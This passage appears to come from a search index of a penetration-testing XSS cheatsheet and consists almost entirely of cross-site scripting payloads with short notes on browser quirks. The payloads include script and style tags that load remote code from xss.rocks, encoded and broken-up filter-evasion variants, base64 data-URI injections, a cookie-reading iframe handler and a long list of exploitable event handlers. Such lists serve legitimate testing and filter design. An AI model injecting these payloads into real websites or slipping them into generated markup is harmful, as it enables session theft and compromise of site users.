"penetration-testing/cheatsheets/xss-cheatsheet/#no-closing-script-tags", "title": "No Closing Script Tags", "text": "<p>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the <code>\\&gt;&lt;/SCRIPT&gt;</code> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:</p> <pre><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#protocol-resolution-in-script-tags", "title": "Protocol Resolution in Script Tags", "text": "<p>This particular variant was submitted by \u0141ukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code>&lt;/SCRIPT&gt;</code> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.</p> <pre><code>&lt;SCRIPT SRC=//xss.rocks/.j&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#half-open-htmljavascript-xss-vector", "title": "Half Open HTML/JavaScript XSS Vector", "text": "<p>Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close \"&gt;\" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: <code>/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\&lt;)\\[^\\\\n\\]+((\\\\%3E)|\\&gt;)/</code> because it doesn't require the end \"&gt;\". As a side note, this was also affective against a real world XSS filter I came across using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag:</p> <pre><code>&lt;IMG SRC=\"`&lt;javascript:alert&gt;`('XSS')\"`\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#double-open-angle-brackets", "title": "Double Open Angle Brackets", "text": "<p>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:</p> <pre><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;`\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#escaping-javascript-escapes", "title": "Escaping JavaScript Escapes", "text": "<p>When the application is written to output some user information inside of a JavaScript like the following: <code>&lt;SCRIPT&gt;var a=\"$ENV{QUERY\\_STRING}\";&lt;/SCRIPT&gt;</code> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <code>&lt;SCRIPT&gt;var a=\"\\\\\\\\\";alert('XSS');//\";&lt;/SCRIPT&gt;</code> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:</p> <pre><code>`\\\";alert('XSS');//`\n</code></pre> <p>An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:</p> <pre><code>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#end-title-tag", "title": "End Title Tag", "text": "<p>This is a simple XSS vector that closes <code>&lt;TITLE&gt;</code> tags, which can encapsulate the malicious cross site scripting attack:</p> <pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#input-image", "title": "INPUT Image", "text": "<pre><code>&lt;input type=\"IMAGE\" src=\"javascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#body-image", "title": "BODY Image", "text": "<pre><code>&lt;body background=\"javascript:alert('XSS')\"&gt;&lt;/body&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-dynsrc", "title": "IMG Dynsrc", "text": "<pre><code>&lt;img DYNSRC=\"javascript:alert('XSS')\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-lowsrc", "title": "IMG Lowsrc", "text": "<pre><code>&lt;img LOWSRC=\"javascript:alert('XSS')\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#list-style-image", "title": "List-style-image", "text": "<p>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:</p> <pre><code>&lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#vbscript-in-an-image", "title": "VBscript in an Image", "text": "<pre><code>&lt;img src='vbscript:msgbox(\"XSS\")' /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#livescript-older-versions-of-netscape-only", "title": "Livescript (older versions of Netscape only)", "text": "<pre><code>&lt;img src=\"livescript:[code]\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#svg-object-tag", "title": "SVG Object Tag", "text": "<pre><code>&lt;svg/onload=alert('XSS')&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ecmascript-6", "title": "ECMAScript 6", "text": "<pre><code>Set.constructor`alert\\x28document.domain\\x29\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#body-tag", "title": "BODY Tag", "text": "<p>Method doesn't require using any variants of <code>javascript:</code> or <code>&lt;SCRIPT...</code> to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign (<code>onload=</code> != <code>onload =</code>):</p> <pre><code>&lt;BODY ONLOAD=alert('XSS')&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#event-handlers", "title": "Event Handlers", "text": "<p>It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.</p> <ol> <li><code>FSCommand()</code> (attacker can use this when executed from within an embedded Flash object)</li> <li><code>onAbort()</code> (when user aborts the loading of an image)</li> <li><code>onActivate()</code> (when object is set as the active element)</li> <li><code>onAfterPrint()</code> (activates after user prints or previews print job)</li> <li><code>onAfterUpdate()</code> (activates on data object after updating data in the source object)</li> <li><code>onBeforeActivate()</code> (fires before the object is set as the active element)</li> <li><code>onBeforeCopy()</code> (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the <code>execCommand(\"Copy\")</code> function)</li> <li><code>onBeforeCut()</code> (attacker executes the attack string right before a selection is cut)</li> <li><code>onBeforeDeactivate()</code> (fires right after the activeElement is changed from the current object)</li> <li><code>onBeforeEditFocus()</code> (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)</li> <li><code>onBeforePaste()</code> (user needs to be tricked into pasting or be forced into it using the <code>execCommand(\"Paste\")</code> function)</li> <li><code>onBeforePrint()</code> (user would need to be tricked into printing or attacker could use the <code>print()</code> or <code>execCommand(\"Print\")</code> function).</li> <li><code>onBeforeUnload()</code> (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)</li> <li><code>onBeforeUpdate()</code> (activates on data object before updating data in the source object)</li> <li><code>onBegin()</code> (the onbegin event fires immediately when the element's timeline begins)</li> <li><code>onBlur()</code> (in the case where another popup is loaded and window looses focus)</li> <li><code>onBounce()</code> (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window)</li> <li><code>onCellChange()</code> (fires when data changes in the data provider)</li> <li><code>onChange()</code> (select, text, or TEXTAREA field loses focus and its value has been modified)</li> <li><code>onClick()</code> (someone clicks on a form)</li> <li><code>onContextMenu()</code> (user would need to right click on attack area)</li> <li><code>onControlSelect()</code> (fires when the user is about to make a control selection of the object)</li> <li><code>onCopy()</code> (user needs to copy something or it can be exploited using the <code>execCommand(\"Copy\")</code> command)</li> <li><code>onCut()</code> (user needs to copy something or it can be exploited using the <code>execCommand(\"Cut\")</code> command)</li> <li><code>onDataAvailable()</code> (user would need to change data in an element, or attacker could perform the same function)</li> <li><code>onDataSetChanged()</code> (fires when the data set exposed by a data source object changes)</li> <li><code>onDataSetComplete()</code> (fires to indicate that all data is available from the data source object)</li> <li><code>onDblClick()</code> (user double-clicks a form element or a link)</li> <li><code>onDeactivate()</code> (fires when the activeElement is changed from the current object to another object in the parent document)</li> <li><code>onDrag()</code> (requires that the user drags an object)</li> <li><code>onDragEnd()</code> (requires that the user drags an object)</li> <li><code>onDragLeave()</code> (requires that the user drags an object off a valid location)</li> <li><code>onDragEnter()</code> (requires that the user drags an object into a valid location)</li> <li><code>onDragOver()</code> (requires that the user drags an object into a valid location)</li> <li><code>onDragDrop()</code> (user drops an object (e.g. file) onto the browser window)</li> <li><code>onDragStart()</code> (occurs when user starts drag operation)</li> <li><code>onDrop()</code> (user drops an object (e.g. file) onto the browser window)</li> <li><code>onEnd()</code> (the onEnd event fires when the timeline ends.</li> <li><code>onError()</code> (loading of a document or image causes an error)</li> <li><code>onErrorUpdate()</code> (fires on a databound object when an error occurs while updating the associated data in the data source object)</li> <li><code>onFilterChange()</code> (fires when a visual filter completes state change)</li> <li><code>onFinish()</code> (attacker can create the exploit when marquee is finished looping)</li> <li><code>onFocus()</code> (attacker executes the attack string when the window gets focus)</li> <li><code>onFocusIn()</code> (attacker executes the attack string when window gets focus)</li> <li><code>onFocusOut()</code> (attacker executes the attack string when window looses focus)</li> <li><code>onHashChange()</code> (fires when the fragment identifier part of the document's current address changed)</li> <li><code>onHelp()</code> (attacker executes the attack string when users hits F1 while the window is in focus)</li> <li><code>onInput()</code> (the text content of an element is changed through the user interface)</li> <li><code>onKeyDown()</code> (user depresses a key)</li> <li><code>onKeyPress()</code> (user presses or holds down a key)</li> <li><code>onKeyUp()</code> (user releases a key)</li> <li><code>onLayoutComplete()</code> (user would have to print or print preview)</li> <li><code>onLoad()</code> (attacker executes the attack string after the window loads)</li> <li><code>onLoseCapture()</code> (can be exploited by the <code>releaseCapture()</code> method)</li> <li><code>onMediaComplete()</code> (When a streaming media file is used, this event could fire before the file starts playing)</li> <li><code>onMediaError()</code> (User opens a page in the browser that contains a media file, and the event fires when there is a problem)</li> <li><code>onMessage()</code> (fire when the document received a message)</li> <li><code>onMouseDown()</code> (the attacker would need to get the user to click on an image)</li> <li><code>onMouseEnter()</code> (cursor moves over an object or area)</li> <li><code>onMouseLeave()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li> <li><code>onMouseMove()</code> (the attacker would need to get the user to mouse over an image or table)</li> <li><code>onMouseOut()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li> <li><code>onMouseOver()</code> (cursor moves over an object or area)</li> <li><code>onMouseUp()</code> (the attacker would need to get the user to click on an image)</li> <li><code>onMouseWheel()</code> (the attacker would need to get the user to use their mouse wheel)</li> <li><code>onMove()</code> (user or attacker would move the page)</li> <li><code>onMoveEnd()</code> (user or attacker would move the page)</li> <li><code>onMoveStart()</code> (user or attacker would move the page)</li> <li><code>onOffline()</code> (occurs if the browser is working in online mode and it starts to work offline)</li> <li><code>onOnline()</code> (occurs if the browser is working in offline mode and it starts to work online)</li> <li><code>onOutOfSync()</code> (interrupt the element's ability to play its media as defined by the timeline)</li> <li><code>onPaste()</code> (user would need to paste or attacker could use the <code>execCommand(\"Paste\")</code> function)</li> <li><code>onPause()</code> (the onpause event fires on every element that is active when the timeline pauses, including the body element)</li> <li><code>onPopState()</code> (fires when user navigated the session history)</li> <li><code>onProgress()</code> (attacker would use this as a flash movie was loading)</li> <li><code>onPropertyChange()</code> (user or attacker would need to change an element property)</li> <li><code>onReadyStateChange()</code> (user or attacker would need to change an element property)</li> <li><code>onRedo()</code> (user went forward in undo transaction history)</li> <li><code>onRepeat()</code> (the event fires once for each repetition of the timeline, excluding the first full cycle)</li> <li><code>onReset()</code> (user or attacker resets a form)</li> <li><code>onResize()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li> <li><code>onResizeEnd()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li> <li><code>onResizeStart()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li> <li><code>onResume()</code> (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)</li> <li><code>onReverse()</code> (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)</li> <li><code>onRowsEnter()</code> (user or attacker would need to change a row in a data source)</li> <li><code>onRowExit()</code> (user or attacker would need to change a row in a data source)</li> <li><code>onRowDelete()</code> (user or attacker would need to delete a row in a data source)</li> <li><code>onRowInserted()</code> (user or attacker would need to insert a row in a data source)</li> <li><code>onScroll()</code> (user would need to scroll, or attacker could use the <code>scrollBy()</code> function)</li> <li><code>onSeek()</code> (the onreverse event fires when the timeline is set to play in any direction other than forward)</li> <li><code>onSelect()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand(\"SelectAll\");</code>)</li> <li><code>onSelectionChange()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand(\"SelectAll\");</code>)</li> <li><code>onSelectStart()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand(\"SelectAll\");</code>)</li> <li><code>onStart()</code> (fires at the beginning of each marquee loop)</li> <li><code>onStop()</code> (user would need to press the stop button or leave the webpage)</li> <li><code>onStorage()</code> (storage area changed)</li> <li><code>onSyncRestored()</code> (user interrupts the element's ability to play its media as defined by the timeline to fire)</li> <li><code>onSubmit()</code> (requires attacker or user submits a form)</li> <li><code>onTimeError()</code> (user or attacker sets a time property, such as dur, to an invalid value)</li> <li><code>onTrackChange()</code> (user or attacker changes track in a playList)</li> <li><code>onUndo()</code> (user went backward in undo transaction history)</li> <li><code>onUnload()</code> (as the user clicks any link or presses the back button or attacker forces a click)</li> <li><code>onURLFlip()</code> (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)</li> <li><code>seekSegmentTime()</code> (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)</li> </ol>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#bgsound", "title": "BGSOUND", "text": "<pre><code>&lt;bgsound SRC=\"javascript:alert('XSS');\"&gt;&lt;/bgsound&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#javascript-includes", "title": "&amp; JavaScript includes", "text": "<pre><code>&lt;br SIZE=\"&amp;{alert('XSS')}\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-sheet", "title": "STYLE sheet", "text": "<pre><code>&lt;link rel=\"stylesheet\" href=\"javascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet", "title": "Remote style sheet", "text": "<p>Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:</p> <pre><code>&lt;link rel=\"stylesheet\" href=\"http://xss.rocks/xss.css\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-2", "title": "Remote style sheet part 2", "text": "<p>This works the same as above, but uses a <code>&lt;STYLE&gt;</code> tag instead of a <code>&lt;LINK&gt;</code> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&gt;</code> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p> <pre><code>&lt;style&gt;\n  @import 'http://xss.rocks/xss.css';\n&lt;/style&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-3", "title": "Remote style sheet part 3", "text": "<p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying <code>Link: &lt;http://xss.rocks/xss.css&gt;; REL=stylesheet</code>) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:</p> <pre><code>&lt;meta http-equiv=\"Link\" content=\"&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-4", "title": "Remote style sheet part 4", "text": "<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:</p> <pre><code>&lt;style&gt;\n  BODY {\n    -moz-binding: url('http://xss.rocks/xssmoz.xml#xss');\n  }\n&lt;/style&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tags-with-broken-up-javascript-for-xss", "title": "STYLE Tags with Broken-up JavaScript for XSS", "text": "<p>This XSS at times sends IE into an infinite loop of alerts:</p> <pre><code>&lt;style&gt;\n  @im \\port'\\ja\\vasc\\ript:alert(\"XSS\")';\n&lt;/style&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-attribute-using-a-comment-to-break-up-expression", "title": "STYLE Attribute using a Comment to Break-up Expression", "text": "<p>Created by Roman Ivanov</p> <pre><code>&lt;img style=\"xss:expr/*XSS*/ession(alert('XSS'))\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-style-with-expression", "title": "IMG STYLE with Expression", "text": "<p>This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:</p> <pre><code>exp/*&lt;a\n  style='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'\n&gt;&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-older-versions-of-netscape-only", "title": "STYLE Tag (Older versions of Netscape only)", "text": "<pre><code>&lt;style type=\"text/javascript\"&gt;\n  alert('XSS');\n&lt;/style&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-using-background-image", "title": "STYLE Tag using Background-image", "text": "<pre><code>&lt;style&gt;\n  .XSS {\n    background-image: url(\"javascript:alert('XSS')\");\n  }&lt;/style\n&gt;&lt;a class=\"XSS\"&gt;&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-using-background", "title": "STYLE Tag using Background", "text": "<pre><code>&lt;style type=\"text/css\"&gt;\n  BODY {\n    background: url(\"javascript:alert('XSS')\");\n  }&lt;/style\n&gt;` `&lt;style type=\"text/css\"&gt;\n  BODY {\n    background: url(\"&lt;javascript:alert&gt;('XSS')\");\n  }\n&lt;/style&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#anonymous-html-with-style-attribute", "title": "Anonymous HTML with STYLE Attribute", "text": "<p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p> <pre><code>&lt;XSS STYLE=\"xss:expression(alert('XSS'))\"&gt;&lt;/XSS&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#local-htc-file", "title": "Local htc File", "text": "<p>This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:</p> <pre><code>&lt;XSS STYLE=\"behavior: url(xss.htc);\"&gt;&lt;/XSS&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#us-ascii-encoding", "title": "US-ASCII Encoding", "text": "<p>US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.</p> <pre><code>`\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be`\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#meta", "title": "META", "text": "<p>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p> <pre><code>&lt;meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#iframe", "title": "IFRAME", "text": "<p>If iframes are allowed there are a lot of other XSS problems as well:</p> <pre><code>&lt;iframe src=\"javascript:alert('XSS');\"&gt;&lt;/iframe&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#iframe-event-based", "title": "IFRAME Event Based", "text": "<p>IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)</p> <pre><code>&lt;iframe src=\"#\" onmouseover=\"alert(document.cookie)\"&gt;&lt;/iframe&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#frame", "title": "FRAME", "text": "<p>Frames have the same sorts of XSS problems as iframes</p> <pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#table", "title": "TABLE", "text": "<pre><code>&lt;table BACKGROUND=\"javascript:alert('XSS')\"&gt;&lt;/table&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#td", "title": "TD", "text": "<p>Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:</p> <pre><code>&lt;table&gt;\n  &lt;td BACKGROUND=\"javascript:alert('XSS')\"&gt;&lt;/td&gt;\n&lt;/table&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div", "title": "DIV", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image", "title": "DIV Background-image", "text": "<pre><code>&lt;div style=\"background-image: url(javascript:alert('XSS'))\"&gt;&lt;/div&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image-with-unicoded-xss-exploit", "title": "DIV Background-image with Unicoded XSS Exploit", "text": "<p>This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:</p> <pre><code>&lt;div\n  style=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"\n&gt;&lt;/div&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image-plus-extra-characters", "title": "DIV Background-image Plus Extra Characters", "text": "<p>Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p> <pre><code>&lt;div style=\"background-image: url(javascript:alert('XSS'))\"&gt;&lt;/div&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-expression", "title": "DIV Expression", "text": "<p>A variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\":</p> <pre><code>&lt;div style=\"width: expression(alert('XSS'));\"&gt;&lt;/div&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#downlevel-hidden-block", "title": "Downlevel-Hidden Block", "text": "<p>Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:</p> <pre><code>&lt;!--[if gte IE 4]&gt;\n  &lt;script&gt;\n    alert('XSS');\n  &lt;/script&gt;\n&lt;![endif]--&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#base-tag", "title": "BASE Tag", "text": "<p>Works in IE and Netscape 8.1 in safe mode. You need the <code>//</code> to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like <code>images/image.jpg</code> rather than full paths. If the path includes a leading forward slash like <code>/images/image.jpg</code> you can remove one slash from this vector (as long as there are two to begin the comment this will work):</p> <pre><code>&lt;base href=\"javascript:alert('XSS');//\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#object-tag", "title": "OBJECT Tag", "text": "<p>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:</p> <pre><code>&lt;object type=\"text/x-scriptlet\" data=\"http://xss.rocks/scriptlet.html\"&gt;&lt;/object&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embed-svg-which-contains-xss-vector", "title": "EMBED SVG Which Contains XSS Vector", "text": "<p>This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.</p> <pre><code>&lt;EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": 